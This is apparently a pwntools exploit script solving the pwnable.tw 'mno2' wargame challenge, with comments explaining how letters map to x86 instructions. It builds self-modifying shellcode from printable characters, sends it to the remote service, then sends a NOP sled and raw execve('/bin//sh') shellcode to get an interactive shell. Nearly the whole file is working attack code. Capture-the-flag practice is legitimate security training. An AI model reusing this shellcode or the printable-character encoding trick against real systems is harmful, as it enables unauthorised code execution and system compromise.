from pwn import *

local = 0
if local:
	p = process("./mno2")
else:
	p = remote("chall.pwnable.tw",10301)

'''
H:   dec    eax
B:   inc    edx
C:   inc    ebx
N:   dec    esi
O:   dec    edi
F:   inc    esi
K:   dec    ebx
I:   dec    ecx

W:   push   edi
U:   push   ebp
P:   push   eax
S:   push   ebx

Y:   pop    ecx
'''
'''
#edx = 0x0804889f

push edx                     #R
push 0x3333334b              #hK333
pop ecx                      #Y
pop ecx                      #Y , ecx = 0x0804889f
dec    ecx * 28 , cl = 0x83  #I*28
xor [eax + 0x65], ecx        #1He
dec    ecx * 28 , cl = 0x67  #I*28
xor [eax + 0x66], ecx        #1Hf

sc1 = RhK333YY + "I"*28 + 1He + "I"*28 + 1Hf

push eax                     #P  
inc edx                      #B unuse
push 0x3333334b              #hK333
pop eax                      #X
xor DWORD PTR gs:[ecx],esi   #e11 ecx = 0, unuse
pop ecx                      #Y      ecx = 0x324F6E4D
xor eax, 0x33333348          #5H333, eax = 3, ebx = 0

sc2= PBhK333Xe11Y5H333
'''

sc1 = "RhK333YY" + "I"*28 + "1He" + "I"*28 + "1Hf"
sc2 = "PBhK333SYXe11Y5H333"
sc = sc1 + sc2
print len(sc)
sc = sc.ljust(0x65,"N")
p.sendline(sc + "No" + "N")#last "N" control the value of cl 
sleep(1)
p.sendline(asm("nop")*0x70 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc2\xb0\x0b\x31\xc9\xcd\x80")
p.interactive()
